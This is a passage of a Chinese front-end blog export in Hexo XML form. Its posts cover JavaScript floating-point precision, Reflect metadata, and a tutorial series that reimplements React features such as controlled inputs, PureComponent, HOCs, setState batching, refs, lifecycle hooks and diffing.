进行了扩展。 metadata 本质上是一个 WeakMap 对象。扩展：Map 和 WeakMap 的区别 Reflect.defineMetadata(metadataKey, metadataValue, target[, propertyKey]) 简化版实现如下： 123456789const Metadata = new WeakMap()function defineMetadata(metadataKey, metadataValue, target, propertyKey) &#123; metadataMap = new Map() metadataMap.set(metadataKey, metadataValue) targetMetadata = new Map() targetMetadata.set(propertyKey, metadataMap) Metadata.set(target, targetMetadata)&#125; Reflect.getOwnMetadata(metadataKey, target[, propertyKey]) 简化版实现如下： 12345function getOwnMetadata(metadataKey, target, propertyKey) &#123; var targetMetadata = Metadata.get(target) var metadataMap = targetMetadata.get(propertyKey) return metadataMap.get(metadataKey)&#125; 其数据结构可表示如下： 1234567WeakMap &#123; target: Map &#123; propertyKey: Map &#123; metadataKey: metadataValue &#125; &#125;&#125; 相关链接 Architecture overview]]></content>
      <categories>
        <category>IoC</category>
      </categories>
      <tags>
        <tag>设计模式</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[探寻 JavaScript 精度问题]]></title>
    <url>%2Fblog%2F2018%2F10%2F03%2F%E6%8E%A2%E5%AF%BB-JavaScript-%E7%B2%BE%E5%BA%A6%E9%97%AE%E9%A2%98%2F</url>
    <content type="text"><![CDATA[阅读完本文可以了解到 0.1 + 0.2 为什么等于 0.30000000000000004 以及 JavaScript 中最大安全数是如何来的。 十进制小数转为二进制小数方法拿 173.8125 举例如何将之转化为二进制小数。 ①. 针对整数部分 173，采取除 2 取余，逆序排列; 12345678173 / 2 = 86 ... 186 / 2 = 43 ... 043 / 2 = 21 ... 1 ↑21 / 2 = 10 ... 1 | 逆序排列10 / 2 = 5 ... 0 |5 / 2 = 2 ... 1 |2 / 2 = 1 ... 01 / 2 = 0 ... 1 得整数部分的二进制为 10101101。 ②. 针对小数部分 0.8125，采用乘 2 取整，顺序排列; 12340.8125 * 2 = 1.625 |0.625 * 2 = 1.25 | 顺序排列0.25 * 2 = 0.5 |0.5 * 2 = 1 ↓ 得小数部分的二进制为 1101。 ③. 将前面两部的结果相加，结果为 10101101.1101; 小心，二进制小数丢失了精度！根据上面的知识，将十进制小数 0.1 转为二进制： 123456789100.1 * 2 = 0.20.2 * 2 = 0.4 // 注意这里0.4 * 2 = 0.80.8 * 2 = 1.60.6 * 2 = 1.20.2 * 2 = 0.4 // 注意这里，循环开始0.4 * 2 = 0.80.8 * 2 = 1.60.6 * 2 = 1.2... 可以发现有限十进制小数 0.1 却转化成了无限二进制小数 0.00011001100...，可以看到精度在转化过程中丢失了！ 能被转化为有限二进制小数的十进制小数的最后一位必然以 5 结尾(因为只有 0.5 * 2 才能变为整数)。所以十进制中一位小数 0.1 ~ 0.9 当中除了 0.5 之外的值在转化成二进制的过程中都丢失了精度。 推导 0.1 + 0.2 为何等于 0.30000000000000004在 JavaScript 中所有数值都以 IEEE-754 标准的 64 bit 双精度浮点数进行存储的。先来了解下 IEEE-754 标准下的双精度浮点数。 这幅图很关键，可以从图中看到 IEEE-754 标准下双精度浮点数由三部分组成，分别如下： sign(符号): 占 1 bit, 表示正负; exponent(指数): 占 11 bit，表示范围; mantissa(尾数): 占 52 bit，表示精度，多出的末尾如果是 1 需要进位; 推荐阅读 JavaScript 浮点数陷阱及解法，阅读完该文后可以了解到以下公式的由来。 精度位总共是 53 bit，因为用科学计数法表示，所以首位固定的 1 就没有占用空间。即公式中 (M + 1) 里的 1。另外公式里的 1023 是 2^11 的一半。小于 1023 的用来表示小数，大于 1023 的用来表示整数。 指数可以控制到 2^1024 - 1，而精度最大只达到 2^53 - 1，两者相比可以得出 JavaScript 实际可以精确表示的数字其实很少。 0.1 转化为二进制为 0.0001100110011...，用科学计数法表示为 1.100110011... x 2^(-4)，根据上述公式，S 为 0(1 bit)，E 为 -4 + 1023，对应的二进制为 01111111011(11 bit)，M 为 1001100110011001100110011001100110011001100110011010(52 bit，另外注意末尾的进位)，0.1 的存储示意图如下: 同理，0.2 转化为二进制为 0.001100110011...，用科学计数法表示为 1.100110011... x 2^(-3)，根据上述公式，E 为 -3 + 1023，对应的二进制为 01111111100, M 为 1001100110011001100110011001100110011001100110011010, 0.2 的存储示意图如下: 0.1 + 0.2 即 2^(-4) x 1.1001100110011001100110011001100110011001100110011010 与 2^(-3) x 1.1001100110011001100110011001100110011001100110011010 之和 123456// 计算过程0.000110011001100110011001100110011001100110011001100110100.0011001100110011001100110011001100110011001100110011010// 相加得0.01001100110011001100110011001100110011001100110011001110 0.01001100110011001100110011001100110011001100110011001110 转化为十进制就是 0.30000000000000004。验证完成! JavaScript 的最大安全数是如何来的根据双精度浮点数的构成，精度位数是 53 bit。安全数的意思是在 -2^53 ~ 2^53 内的整数(不包括边界)与唯一的双精度浮点数互相对应。举个例子比较好理解： 1Math.pow(2, 53) === Math.pow(2, 53) + 1 // true Math.pow(2, 53) 竟然与 Math.pow(2, 53) + 1 相等！这是因为 Math.pow(2, 53) + 1 已经超过了尾数的精度限制(53 bit)，在这个例子中 Math.pow(2, 53) 和 Math.pow(2, 53) + 1 对应了同一个双精度浮点数。所以 Math.pow(2, 53) 就不是安全数了。 最大的安全数为 Math.pow(2, 53) - 1，即 9007199254740991。 相关链接 代码之谜系列 IEEE-754 进制转换图生成 JavaScript 浮点数陷阱及解法: 推荐阅读 javascript 里最大的安全的整数为什么是2的53次方减一]]></content>
      <categories>
        <category>JavaScrip</category>
        <category>精度</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
        <tag>精度</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[从 0 到 1 实现 React 系列 —— 6.onChange 事件以及受控组件]]></title>
    <url>%2Fblog%2F2018%2F09%2F18%2F%E4%BB%8E-0-%E5%88%B0-1-%E5%AE%9E%E7%8E%B0-React-%E7%B3%BB%E5%88%97-%E2%80%94%E2%80%94-6-onChange-%E4%BA%8B%E4%BB%B6%E4%BB%A5%E5%8F%8A%E5%8F%97%E6%8E%A7%E7%BB%84%E4%BB%B6%2F</url>
    <content type="text"><![CDATA[本系列文章在实现一个 cpreact 的同时帮助大家理顺 React 框架的核心内容(JSX/虚拟DOM/组件/生命周期/diff算法/setState/PureComponent/HOC/…) 项目地址 从一个疑问点开始接上一章 HOC 探索 抛出的问题 ———— react 中的 onChange 事件和原生 DOM 事件中的 onchange 表现不一致，举例说明如下： 123456789101112131415161718192021222324// React 中的 onChange 事件class App extends Component &#123; constructor(props) &#123; super(props) this.onChange = this.onChange.bind(this) &#125; onChange(e) &#123; console.log('键盘松开立刻执行') &#125; render() &#123; return ( &lt;input onChange=&#123;this.onChange&#125; /&gt; ) &#125;&#125;/*--------------分割线---------------*/// 原生 DOM 事件中的 onchange 事件：&lt;input id='test'&gt;document.getElementById('test').addEventListener('change', (e) =&gt; &#123; console.log('键盘松开以后还需按下回车键或者点下鼠标才会触发')&#125;) 拨云见雾我们来看下 React 的一个 issue React Fire: Modernizing React DOM。有两点信息和这篇文章的话题相关。 Drastically simplify the event system Migrate from onChange to onInput and don’t polyfill it for uncontrolled components 从这两点内容我们可以得知下面的信息： React 实现了一套合成事件机制，也就是它的事件机制和原生事件间会有不同。比如它目前 onChange 事件其实对应着原生事件中的 input 事件。在这个 issue 中明确了未来会使用 onInput 事件替代 onChange 事件，并且会大幅度地简化合成事件。 有了以上信息后，我们对 onChange 事件(将来的 onInput 事件)的代码作如下更改： 123456789function setAttribute(dom, attr, value) &#123; ... if (attr.match(/on\w+/)) &#123; // 处理事件的属性: let eventName = attr.toLowerCase().substr(2) if (eventName === 'change') &#123; eventName = 'input' &#125; // 和现阶段的 react 统一 dom.addEventListener(eventName, value) &#125; ...&#125; 自由组件以及受控组件区分自由组件以及受控组件在于表单的值是否由 value 这个属性控制，比较如下代码： 123const case1 = () =&gt; &lt;input /&gt; // 此时输入框内可以随意增减任意值const case2 = () =&gt; &lt;input defaultValue=&#123;123&#125; /&gt; // 此时输入框内显示 123，能随意增减值const case3 = () =&gt; &lt;input value=&#123;123&#125; /&gt; // 此时输入框内显示 123，并且不能随意增减值 case3 的情形即为简化版的受控组件。 受控组件的实现题目可以换个问法：当 input 的传入属性为 value 时(且没有 onChange 属性)，如何禁用用户的输入事件的同时又能获取焦点? 首先想到了 html 自带属性 readonly、disable，它们都能禁止用户的输入，但是它们不能满足获取焦点这个条件。结合前文 onChange 的实现是监听 input 事件，代码分为以下两种情况： 1.dom 节点包含 value 属性、onChange 属性2.dom 节点包含 value 属性，不包含 onChange 属性 代码如下： 1234567891011121314151617181920212223function vdomToDom(vdom) &#123; ... if (vdom.attributes &amp;&amp; vdom.attributes.hasOwnProperty('onChange') &amp;&amp; vdom.attributes.hasOwnProperty('value')) &#123; // 受控组件逻辑 ... dom.addEventListener('input', (e) =&gt; &#123; changeCb.call(this, e) dom.value = oldValue &#125;) ... &#125; if (vdom.attributes &amp;&amp; !vdom.attributes.hasOwnProperty('onChange') &amp;&amp; vdom.attributes.hasOwnProperty('value')) &#123; // 受控组件逻辑 ... dom.addEventListener('input', (e) =&gt; &#123; dom.value = oldValue &#125;) ... &#125; ...&#125; 可以发现它们的核心都在这段代码上： 1234dom.addEventListener('input', (e) =&gt; &#123; changeCb.call(this, e) dom.value = oldValue&#125;) 区别是当有 onChange 属性 时，能提供相应的回调函数 changeCb 通过事件循环机制改变表单的值。看如下两个例子的比较： 1const App = () =&gt; &lt;input value=&#123;123&#125; /&gt; 效果如下： 123456789101112131415161718192021class App extends Component &#123; constructor() &#123; super() this.state = &#123; num: 123 &#125; this.change = this.change.bind(this) &#125; change(e) &#123; this.setState(&#123; num: e.target.value &#125;) &#125; render() &#123; return ( &lt;div&gt; &lt;input value=&#123;this.state.num&#125; onChange=&#123;this.change&#125; /&gt; &lt;/div&gt; ) &#125;&#125; 这段代码中的 change 函数即上个段落所谓的 changeCb 函数，通过 setState 的事件循环机制改变表单的值。 效果如下： 至此，模拟了受控组件的实现。]]></content>
      <categories>
        <category>React</category>
      </categories>
      <tags>
        <tag>React</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[从 0 到 1 实现 React 系列 —— 5.PureComponent 实现 && HOC 探幽]]></title>
    <url>%2Fblog%2F2018%2F08%2F27%2F%E4%BB%8E-0-%E5%88%B0-1-%E5%AE%9E%E7%8E%B0-React-%E7%B3%BB%E5%88%97-%E2%80%94%E2%80%94-5-PureComponent-%E5%AE%9E%E7%8E%B0-HOC-%E6%8E%A2%E5%B9%BD%2F</url>
    <content type="text"><![CDATA[本系列文章在实现一个 cpreact 的同时帮助大家理顺 React 框架的核心内容(JSX/虚拟DOM/组件/生命周期/diff算法/setState/PureComponent/HOC/…) 项目地址 从 0 到 1 实现 React 系列 —— JSX 和 Virtual DOM 从 0 到 1 实现 React 系列 —— 组件和 state|props 从 0 到 1 实现 React 系列 —— 生命周期和 diff 算法 从 0 到 1 实现 React 系列 —— 优化 setState 和 ref 的实现 从 0 到 1 实现 React 系列 —— PureComponent 实现 &amp;&amp; HOC 探幽 PureComponent 精髓使用 PureComponent 是优化 React 性能的一种常用手段，相较于 Component, PureComponent 会在 render 之前自动执行一次 shouldComponentUpdate() 函数，根据返回的 bool 值判断是否进行 render。其中有个重点是 PureComponent 在 shouldComponentUpdate() 的时候会进行 shallowEqual(浅比较)。 PureComponent 的浅比较策略如下： 对 prevState/nextState 以及 prevProps/nextProps 这两组数据进行浅比较： 1.对象第一层数据未发生改变，render 方法不会触发；2.对象第一层数据发生改变(包括第一层数据引用的改变)，render 方法会触发; PureComponent 的实现照着上述思路我们来实现 PureComponent 的逻辑 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748function PureComponent(props) &#123; this.props = props || &#123;&#125; this.state = &#123;&#125; isShouldComponentUpdate.call(this) // 为每个 PureComponent 绑定 shouldComponentUpdate 方法&#125;PureComponent.prototype.setState = function(updater, cb) &#123; isShouldComponentUpdate.call(this) // 调用 setState 时，让 this 指向子类的实例，目的取到子类的 this.state asyncRender(updater, this, cb)&#125;function isShouldComponentUpdate() &#123; const cpState = this.state const cpProps = this.props this.shouldComponentUpdate = function (nextProps, nextState) &#123; if (!shallowEqual(cpState, nextState) || !shallowEqual(cpProps, nextProps)) &#123; return true // 只要 state 或 props 浅比较不等的话，就进行渲染 &#125; else &#123; return false // 浅比较相等的话，不渲染 &#125; &#125;&#125;// 浅比较逻辑const shallowEqual = function(oldState, nextState) &#123; const oldKeys = Object.keys(oldState) const newKeys = Object.keys(nextState) if (oldKeys.length !== newKeys.length) &#123; return false &#125; let flag = true for (let i = 0; i &lt; oldKeys.length; i++) &#123; if (!nextState.hasOwnProperty(oldKeys[i])) &#123; flag = false break &#125; if (nextState[oldKeys[i]] !== oldState[oldKeys[i]]) &#123; flag = false break &#125; &#125; return flag&#125; 测试用例测试用例用 在 React 上提的一个 issue 中的案例，我们期望点击增加按钮后，页面上显示的值能够加 1。 123456789101112131415161718192021222324class B extends PureComponent &#123; constructor(props) &#123; super(props) this.state = &#123; count: 0 &#125; this.click = this.click.bind(this) &#125; click() &#123; this.setState(&#123; count: ++this.state.count, &#125;) &#125; render() &#123; return ( &lt;div&gt; &lt;button onClick=&#123;this.click&#125;&gt;增加&lt;/button&gt; &lt;div&gt;&#123;this.state.count&#125;&lt;/div&gt; &lt;/div&gt; ) &#125;&#125; 然而，我们点击上述代码，页面上显示的 0 分毫不动！！！ 揭秘如下： 1234567click() &#123; const t = ++this.state.count console.log(t === this.state.count) // true this.setState(&#123; count: t, &#125;)&#125; 当点击增加按钮，控制台显示 t === this.state.count 为 true, 也就说明了 setState 前后的状态是统一的，所以 shallowEqual(浅比较) 返回的是 true，致使 shouldComponentUpdate 返回了 false，页面因此没有渲染。 类似的，如下写法也是达不到目标的，留给读者思考了。 12345click() &#123; this.setState(&#123; count: this.state.count++, &#125;)&#125; 那么如何达到我们期望的目标呢。揭秘如下： 12345click() &#123; this.setState(&#123; count: this.state.count + 1 &#125;)&#125; 感悟：小小的一行代码里蕴藏着无数的 bug。 HOC 实践高阶组件(Higher Order Component) 不属于 React API 范畴，但是它在 React 中也是一种实用的技术，它可以将常见任务抽象成一个可重用的部分。这个小节算是番外篇，会结合 cpreact(前文实现的类 react 轮子) 与 HOC 进行相关的实践。 它可以用如下公式表示： 12345y = f(x),// x：原有组件// y：高阶组件// f()： f() 的实现有两种方法，下面进行实践。 属性代理(Props Proxy)这类实现也是装饰器模式的一种运用，通过装饰器函数给原来函数赋能。下面例子在装饰器函数中给被装饰的组件传递了额外的属性 { a: 1, b: 2 }。 声明：下文所展示的 demo 均已在 cpreact 测试通过 12345678910111213141516171819202122function ppHOC(WrappedComponent) &#123; return class extends Component &#123; render() &#123; const obj = &#123; a: 1, b: 2 &#125; return ( &lt;WrappedComponent &#123; ...this.props &#125; &#123; ...obj &#125; /&gt; ) &#125; &#125;&#125;@ppHOCclass B extends Component &#123; render() &#123; return ( &lt;div&gt; &#123; this.props.a + this.props.b &#125; &#123; /* 输出 3 */ &#125; &lt;/div&gt; ) &#125;&#125; 要是将 { a: 1, b: 2 } 替换成全局共享对象，那么不就是 react-redux 中的 Connect 了么? 改进上述 demo，我们就可以实现可插拔的受控组件，代码示意如下： 12345678910111213141516171819202122232425262728293031323334353637383940function ppDecorate(WrappedComponent) &#123; return class extends Component &#123; constructor() &#123; super() this.state = &#123; value: '' &#125; this.onChange = this.onChange.bind(this) &#125; onChange(e) &#123; this.setState(&#123; value: e.target.value &#125;) &#125; render() &#123; const obj = &#123; onChange: this.onChange, value: this.state.value, &#125; return ( &lt;WrappedComponent &#123; ...this.props &#125; &#123; ...obj &#125; /&gt; ) &#125; &#125;&#125;@ppDecorateclass B extends Component &#123; render() &#123; return ( &lt;div&gt; &lt;input &#123; ...this.props &#125; /&gt; &lt;div&gt;&#123; this.props.value &#125;&lt;/div&gt; &lt;/div&gt; ) &#125;&#125; 效果如下图： 这里有个坑点，当我们在输入框输入字符的时候，并不会立马触发 onChange 事件(我们想要让事件立即触发，然而现在要按下回车键或者点下鼠标才触发)，在 react 中有个合成事件 的知识点，下篇文章会进行探究。 顺带一提在这个 demo 中似乎看到了双向绑定的效果，但是实际中 React 并没有双向绑定的概念，但是我们可以运用 HOC 的知识点结合 setState 在 React 表单中实现伪双向绑定的效果。 继承反转(Inheritance Inversion)继承反转的核心是：传入 HOC 的组件会作为返回类的父类来使用。然后在 render 中调用 super.render() 来调用父类的 render 方法。 在 《ES6 继承与 ES5 继承的差异》中我们提到了作为对象使用的 super 指向父类的实例。 123456789101112131415161718192021function iiHOC(WrappedComponent) &#123; return class extends WrappedComponent &#123; render() &#123; const parentRender = super.render() if (parentRender.nodeName === 'span') &#123; return ( &lt;span&gt;继承反转&lt;/span&gt; ) &#125; &#125; &#125;&#125;@iiHOCclass B extends Component &#123; render() &#123; return ( &lt;span&gt;Inheritance Inversion&lt;/span&gt; ) &#125;&#125; 在这个 demo 中，在 HOC 内实现了渲染劫持，页面上最终显示如下： 可能会有疑惑，使用属性代理的方式貌似也能实现渲染劫持呀，但是那样做没有继承反转这种方式纯粹。 鸣谢Especially thank simple-react for the guidance function of this library. At the meantime，respect for preact and react 相关链接 A doubt behaviour using the PureComponent React 的性能优化（一）当 PureComponent 遇上 ImmutableJS React性能优化方案之PureComponent 带着三个问题深入浅出React高阶组件 深入理解 React 高阶组件]]></content>
      <categories>
        <category>React</category>
      </categories>
      <tags>
        <tag>React</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[常见数据结构小结]]></title>
    <url>%2Fblog%2F2018%2F08%2F18%2F%E5%B8%B8%E8%A7%81%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%95%B4%E7%90%86%2F</url>
    <content type="text"><![CDATA[常见数据结构的 JS 实现 栈 队列 链表 集合 字典 哈希表 二叉树 图 前端与数据结构数据结构在开发中是一种编程思想的提炼，无关于用何种语言开发或者是哪种端开发。下列将笔者涉猎到的与前端相关的数据结构案例作如下总结： 数据结构 案例 栈 FILO: 其它数据结构的基础，redux/koa2 中间件机制 队列 FIFO：其它数据结构的基础 链表 React 16 中的 Fiber 的优化 集合 对应 JavaScript 中的 Set 字典 对应 JavaScript 中的 Map 哈希表 一种特殊的字典，可以用来存储加密数据 树 DOM TREE / HTML TREE / CSS TREE 图 暂时没遇到，不过里面的 BFS/DFS 蛮常见]]></content>
      <categories>
        <category>数据结构</category>
      </categories>
      <tags>
        <tag>数据结构</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[从 0 到 1 实现 React 系列 —— 4.setState优化和ref的实现]]></title>
    <url>%2Fblog%2F2018%2F08%2F05%2F%E4%BB%8E-0-%E5%88%B0-1-%E5%AE%9E%E7%8E%B0-React-%E7%B3%BB%E5%88%97-%E2%80%94%E2%80%94-4-setState%E4%BC%98%E5%8C%96%E5%92%8Cref%E7%9A%84%E5%AE%9E%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[本系列文章在实现一个 cpreact 的同时帮助大家理顺 React 框架的核心内容(JSX/虚拟DOM/组件/生命周期/diff算法/setState/PureComponent/HOC/…) 项目地址 从 0 到 1 实现 React 系列 —— JSX 和 Virtual DOM 从 0 到 1 实现 React 系列 —— 组件和 state|props 从 0 到 1 实现 React 系列 —— 生命周期和 diff 算法 从 0 到 1 实现 React 系列 —— 优化 setState 和 ref 的实现 从 0 到 1 实现 React 系列 —— PureComponent 实现 &amp;&amp; HOC 探幽 同步 setState 的问题而在现有 setState 逻辑实现中，每调用一次 setState 就会执行 render 一次。因此在如下代码中，每次点击增加按钮，因为 click 方法里调用了 10 次 setState 函数，页面也会被渲染 10 次。而我们希望的是每点击一次增加按钮只执行 render 函数一次。 123456789101112131415161718192021222324252627export default class B extends Component &#123; constructor(props) &#123; super(props) this.state = &#123; count: 0 &#125; this.click = this.click.bind(this) &#125; click() &#123; for (let i = 0; i &lt; 10; i++) &#123; this.setState(&#123; // 在先前的逻辑中，没调用一次 setState 就会 render 一次 count: ++this.state.count &#125;) &#125; &#125; render() &#123; console.log(this.state.count) return ( &lt;div&gt; &lt;button onClick=&#123;this.click&#125;&gt;增加&lt;/button&gt; &lt;div&gt;&#123;this.state.count&#125;&lt;/div&gt; &lt;/div&gt; ) &#125;&#125; 异步调用 setState查阅 setState 的 api，其形式如下： 1setState(updater, [callback]) 它能接收两个参数，其中第一个参数 updater 可以为对象或者为函数 ((prevState, props) =&gt; stateChange)，第二个参数为回调函数； 确定优化思路为：将多次 setState 后跟着的值进行浅合并，并借助事件循环等所有值合并好之后再进行渲染界面。 1234567891011121314151617181920212223242526272829303132let componentArr = []// 异步渲染function asyncRender(updater, component, cb) &#123; if (componentArr.length === 0) &#123; defer(() =&gt; render()) // 利用事件循环，延迟渲染函数的调用 &#125; if (cb) defer(cb) // 调用回调函数 if (_.isFunction(updater)) &#123; // 处理 setState 后跟函数的情况 updater = updater(component.state, component.props) &#125; // 浅合并逻辑 component.state = Object.assign(&#123;&#125;, component.state, updater) if (componentArr.includes(component)) &#123; component.state = Object.assign(&#123;&#125;, component.state, updater) &#125; else &#123; componentArr.push(component) &#125;&#125;function render() &#123; let component while (component = componentArr.shift()) &#123; renderComponent(component) // rerender &#125;&#125;// 事件循环，关于 promise 的事件循环和 setTimeout 的事件循环后续会单独写篇文章。const defer = function(fn) &#123; return Promise.resolve().then(() =&gt; fn())&#125; 此时，每点击一次增加按钮 render 函数只执行一次了。 ref 的实现在 react 中并不建议使用 ref 属性，而应该尽量使用状态提升，但是 react 还是提供了 ref 属性赋予了开发者操作 dom 的能力，react 的 ref 有 string、callback、createRef 三种形式，分别如下： 123456789101112131415161718192021222324252627282930313233343536// string 这种写法未来会被抛弃class MyComponent extends Component &#123; componentDidMount() &#123; this.refs.myRef.focus() &#125; render() &#123; return &lt;input ref="myRef" /&gt; &#125;&#125;// callback(比较通用)class MyComponent extends Component &#123; componentDidMount() &#123; this.myRef.focus() &#125; render() &#123; return &lt;input ref=&#123;(ele) =&gt; &#123; this.myRef = ele &#125;&#125; /&gt; &#125;&#125;// react 16.3 增加，其它 react-like 框架还没有同步class MyComponent extends Component &#123; constructor() &#123; super() &#123; this.myRef = React.createRef() &#125; &#125; componentDidMount() &#123; this.myRef.current.focus() &#125; render() &#123; return &lt;input ref=&#123;this.myRef&#125; /&gt; &#125;&#125; React ref 的前世今生 罗列了三种写法的差异，下面对上述例子中的第二种写法(比较通用)进行实现。 首先在 setAttribute 方法内补充上对 ref 的属性进行特殊处理， 123456789function setAttribute(dom, attr, value) &#123; ... else if (attr === 'ref') &#123; // 处理 ref 属性 if (_.isFunction(value)) &#123; value(dom) &#125; &#125; ...&#125; 针对这个例子中 this.myRef.focus() 的 focus 属性需要异步处理，因为调用 componentDidMount 的时候，界面上还未添加 dom 元素。处理 renderComponent 函数： 1234567function renderComponent(component) &#123; ... else if (component &amp;&amp; component.componentDidMount) &#123; defer(component.componentDidMount.bind(component)) &#125; ...&#125; 刷新页面，可以发现 input 框已为选中状态。 处理完普通元素的 ref 后，再来处理下自定义组件的 ref 的情况。之前默认自定义组件上是没属性的，现在只要针对自定义组件的 ref 属性做相应处理即可。稍微修改 vdomToDom 函数如下： 123456789101112function vdomToDom(vdom) &#123; if (_.isFunction(vdom.nodeName)) &#123; // 此时是自定义组件 ... for (const attr in vdom.attributes) &#123; // 处理自定义组件的 ref 属性 if (attr === 'ref' &amp;&amp; _.isFunction(vdom.attributes[attr])) &#123; vdom.attributes[attr](component) &#125; &#125; ... &#125; ...&#125; 跑如下测试用例： 123456789101112131415161718192021222324252627282930313233343536373839class A extends Component &#123; constructor() &#123; super() this.state = &#123; count: 0 &#125; this.click = this.click.bind(this) &#125; click() &#123; this.setState(&#123; count: ++this.state.count &#125;) &#125; render() &#123; return &lt;div&gt;&#123;this.state.count&#125;&lt;/div&gt; &#125;&#125;class B extends Component &#123; constructor() &#123; super() this.click = this.click.bind(this) &#125; click() &#123; this.A.click() &#125; render() &#123; return ( &lt;div&gt; &lt;button onClick=&#123;this.click&#125;&gt;加1&lt;/button&gt; &lt;A ref=&#123;(e) =&gt; &#123; this.A = e &#125;&#125; /&gt; &lt;/div&gt; ) &#125;&#125; 效果如下： 鸣谢Especially thank simple-react for the guidance function of this library. At the meantime，respect for preact and react]]></content>
      <categories>
        <category>React</category>
      </categories>
      <tags>
        <tag>React</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[从 0 到 1 实现 React 系列 —— 3.生命周期和 diff 算法]]></title>
    <url>%2Fblog%2F2018%2F07%2F27%2F%E4%BB%8E-0-%E5%88%B0-1-%E5%AE%9E%E7%8E%B0-React-%E7%B3%BB%E5%88%97-%E2%80%94%E2%80%94-3.%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E5%92%8C-diff-%E7%AE%97%E6%B3%95%2F</url>
    <content type="text"><![CDATA[本系列文章在实现一个 cpreact 的同时帮助大家理顺 React 框架的核心内容(JSX/虚拟DOM/组件/生命周期/diff算法/setState/PureComponent/HOC/…) 项目地址 从 0 到 1 实现 React 系列 —— JSX 和 Virtual DOM 从 0 到 1 实现 React 系列 —— 组件和 state|props 从 0 到 1 实现 React 系列 —— 生命周期和 diff 算法 从 0 到 1 实现 React 系列 —— 优化 setState 和 ref 的实现 从 0 到 1 实现 React 系列 —— PureComponent 实现 &amp;&amp; HOC 探幽 生命周期先来回顾 React 的生命周期，用流程图表示如下： 该流程图比较清晰地呈现了 react 的生命周期。其分为 3 个阶段 —— 生成期，存在期，销毁期。 因为生命周期钩子函数存在于自定义组件中，将之前 _render 函数作些调整如下： 12345678910// 原来的 _render 函数，为了将职责拆分得更细，将 virtual dom 转为 real dom 的函数单独抽离出来function vdomToDom(vdom) &#123; if (_.isFunction(vdom.nodeName)) &#123; // 为了更加方便地书写生命周期逻辑，将解析自定义组件逻辑和一般 html 标签的逻辑分离开 const component = createComponent(vdom) // 构造组件 setProps(component) // 更改组件 props renderComponent(component) // 渲染组件，将 dom 节点赋值到 component return component.base // 返回真实 dom &#125; ...&#125; 我们可以在 setProps 函数内（渲染前）加入 componentWillMount，componentWillReceiveProps 方法，setProps 函数如下： 1234567function setProps(component) &#123; if (component &amp;&amp; component.componentWillMount) &#123; component.componentWillMount() &#125; else if (component.base &amp;&amp; component.componentWillReceiveProps) &#123; component.componentWillReceiveProps(component.props) // 后面待实现 &#125;&#125; 而后我们在 renderComponent 函数内加入 componentDidMount、shouldComponentUpdate、componentWillUpdate、componentDidUpdate 方法 1234567891011121314151617181920212223242526function renderComponent(component) &#123; if (component.base &amp;&amp; component.shouldComponentUpdate) &#123; const bool = component.shouldComponentUpdate(component.props, component.state) if (!bool &amp;&amp; bool !== undefined) &#123; return false // shouldComponentUpdate() 返回 false，则生命周期终止 &#125; &#125; if (component.base &amp;&amp; component.componentWillUpdate) &#123; component.componentWillUpdate() &#125; const rendered = component.render() const base = vdomToDom(rendered) if (component.base &amp;&amp; component.componentDidUpdate) &#123; component.componentDidUpdate() &#125; else if (component &amp;&amp; component.componentDidMount) &#123; component.componentDidMount() &#125; if (component.base &amp;&amp; component.base.parentNode) &#123; // setState 进入此逻辑 component.base.parentNode.replaceChild(base, component.base) &#125; component.base = base // 标志符&#125; 测试生命周期测试如下用例： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162class A extends Component &#123; componentWillReceiveProps(props) &#123; console.log('componentWillReceiveProps') &#125; render() &#123; return ( &lt;div&gt;&#123;this.props.count&#125;&lt;/div&gt; ) &#125;&#125;class B extends Component &#123; constructor(props) &#123; super(props) this.state = &#123; count: 1 &#125; &#125; componentWillMount() &#123; console.log('componentWillMount') &#125; componentDidMount() &#123; console.log('componentDidMount') &#125; shouldComponentUpdate(nextProps, nextState) &#123; console.log('shouldComponentUpdate', nextProps, nextState) return true &#125; componentWillUpdate() &#123; console.log('componentWillUpdate') &#125; componentDidUpdate() &#123; console.log('componentDidUpdate') &#125; click() &#123; this.setState(&#123; count: ++this.state.count &#125;) &#125; render() &#123; console.log('render') return ( &lt;div&gt; &lt;button onClick=&#123;this.click.bind(this)&#125;&gt;Click Me!&lt;/button&gt; &lt;A count=&#123;this.state.count&#125; /&gt; &lt;/div&gt; ) &#125;&#125;ReactDOM.render( &lt;B /&gt;, document.getElementById('root')) 页面加载时输出结果如下： 123componentWillMountrendercomponentDidMount 点击按钮时输出结果如下： 1234shouldComponentUpdatecomponentWillUpdaterendercomponentDidUpdate diff 的实现在 react 中，diff 实现的思路是将新老 virtual dom 进行比较，将比较后的 patch（补丁）渲染到页面上，从而实现局部刷新；本文借鉴了 preact 和 simple-react 中的 diff 实现，总体思路是将旧的 dom 节点和新的 virtual dom 节点进行了比较，根据不同的比较类型（文本节点、非文本节点、自定义组件）调用相应的逻辑，从而实现页面的局部渲染。代码总体结构如下： 123456789101112131415161718192021222324252627/** * 比较旧的 dom 节点和新的 virtual dom 节点： * @param &#123;*&#125; oldDom 旧的 dom 节点 * @param &#123;*&#125; newVdom 新的 virtual dom 节点 */function diff(oldDom, newVdom) &#123; ... if (_.isString(newVdom)) &#123; return diffTextDom(oldDom, newVdom) // 对比文本 dom 节点 &#125; if (oldDom.nodeName.toLowerCase() !== newVdom.nodeName) &#123; diffNotTextDom(oldDom, newVdom) // 对比非文本 dom 节点 &#125; if (_.isFunction(newVdom.nodeName)) &#123; return diffComponent(oldDom, newVdom) // 对比自定义组件 &#125; diffAttribute(oldDom, newVdom) // 对比属性 if (newVdom.children.length &gt; 0) &#123; diffChild(oldDom, newVdom) // 遍历对比子节点 &#125; return oldDom&#125; 下面根据不同比较类型实现相应逻辑。 对比文本节点首先进行较为简单的文本节点的比较，代码如下： 123456789101112131415// 对比文本节点function diffTextDom(oldDom, newVdom) &#123; let dom = oldDom if (oldDom &amp;&amp; oldDom.nodeType === 3) &#123; // 如果老节点是文本节点 if 